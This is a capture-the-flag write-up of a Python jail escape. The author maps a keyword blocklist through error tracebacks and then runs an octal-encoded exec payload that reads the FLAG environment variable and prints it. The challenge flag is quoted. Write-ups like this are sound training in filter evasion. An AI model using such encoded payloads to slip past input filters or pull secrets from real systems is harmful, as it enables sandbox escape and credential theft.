*You step into a constricted floor where every movement and operation is limited. Commands are few, space is tight, and options are restricted.*  

*A guardian looms over the floor, its body shifting like liquid metal, enforcing these constraints. It watches your every move, daring you to make do with what you have and uncover the passcode to the next floor despite the restrictions.*  

*Connection: nc chall_citadel.cryptonitemit.in 32770*  

## What I did:
* After testing the python interpreter multiple times , I found out that :
```
>>> print

ERROR:
Traceback (most recent call last):
  File "/home/user/pyjail_challenge.py", line 26, in <module>
    exec('from os import *; ' + clean(user_input))
  File "/home/user/pyjail_challenge.py", line 18, in clean
    raise ValueError(f"NUH UH, {word} is not allowed!{although}")
ValueError: NUH UH, print is not allowed! (although print is very close)

>>> flag

ERROR:
Traceback (most recent call last):
  File "/home/user/pyjail_challenge.py", line 26, in <module>
    exec('from os import *; ' + clean(user_input))
  File "/home/user/pyjail_challenge.py", line 18, in clean
    raise ValueError(f"NUH UH, {word} is not allowed!{although}")
ValueError: NUH UH, flag is not allowed! (although flag is very close)
```
* Print and flag didn't get accepted but it said that they are very close.
* *exec(*'*from os import* *; ' + clean(user_input))* this line tells us that something is being imported. After trying 'environ'. We see that :
```
ERROR:
Traceback (most recent call last):
  File "/chall", line 23, in <module>
    exec('from os import *; ' + clean(user_input))
                                ^^^^^^^^^^^^^^^^^
  File "/chall", line 15, in clean
    raise ValueError(f"NUH UH, {word} is not allowed!{although}")
ValueError: NUH UH, environ is not allowed! (although environ is very close)
```
* After trying multiple commands , we find that exec is accepted .
* So we know that the whitelist is {exec,lower,print related,flag related,environ related}
* Upon further deliberation:
```
print(__import__('os').environ.get('FLAG'))
ERROR:
Traceback (most recent call last):
  File "/home/user/pyjail_challenge.py", line 26, in <module>
    exec('from os import *; ' + clean(user_input))
  File "/home/user/pyjail_challenge.py", line 18, in clean
    raise ValueError(f"NUH UH, {word} is not allowed!{although}")
ValueError: NUH UH, print is not allowed! (although print is very close)
```
* So , we tried :
```
>>> exec("\160\162\151\156\164\050\137\137\151\155\160\157\162\164\137\137\050\047\157\163\047\051\056\145\156\166\151\162\157\156\056\147\145\164\050\047\106\114\101\107\047\051\051")
citadel{d34th_d035_n07_fr33_y0u_fr0m_7h3_gu17ar15t}
```
which printed the flag.


```
flag: citadel{d34th_d035_n07_fr33_y0u_fr0m_7h3_gu17ar15t}
```
